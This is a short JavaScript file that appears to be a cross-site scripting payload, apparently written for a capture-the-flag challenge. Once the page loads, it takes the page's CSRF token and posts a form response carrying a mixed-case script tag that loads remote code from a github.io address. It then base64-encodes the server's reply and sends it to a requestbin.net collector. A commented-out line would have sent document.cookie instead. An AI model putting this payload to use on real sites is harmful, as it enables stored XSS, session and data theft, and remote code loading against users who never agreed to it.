document.onreadystatechange = function () {
 if (document.readyState === 'complete') {
  gofun();
 }
}
function gofun() {
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open( "POST", document.location, false);
	xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	var MyToken = document.getElementById("csrf_token").value;
	var MyTitle = "hey";
	var MyCategory = "password_reset";
//	var MyMessage = "FLAG !"+document.cookie
	var MyMessage = "<sCrIpT language=javascript src='https://bradythegoat.github.io/supersite/get.js'></sCrIpt>";
	xmlHttp.send("csrf_token="+MyToken+"&response="+MyMessage);
	var ret = xmlHttp.responseText;
	var x = new XMLHttpRequest();
	x.open("GET", "http://requestbin.net/r/14asih01?inspect="+btoa(ret), false);
	x.send();
}
